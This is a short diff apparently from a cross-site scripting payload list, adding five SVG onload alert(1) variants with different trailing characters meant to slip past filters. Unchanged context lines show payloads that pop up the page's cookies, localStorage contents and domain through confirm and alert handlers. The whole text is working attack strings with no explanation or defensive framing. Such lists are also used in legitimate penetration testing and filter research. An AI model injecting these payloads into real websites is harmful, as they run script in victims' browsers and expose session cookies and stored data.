@@ -9,3 +9,8 @@
 <svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
 \">'>\"><img/src/onerror=confirm(document.cookie)>
 <svg on onload=(alert)(document.domain)>
+<svg onload='alert(1)'
+<svg onload="alert(1)"
+<svg onload=alert(1)//
+<svg onload=alert(1)+
+<svg onload=alert(1)<!--
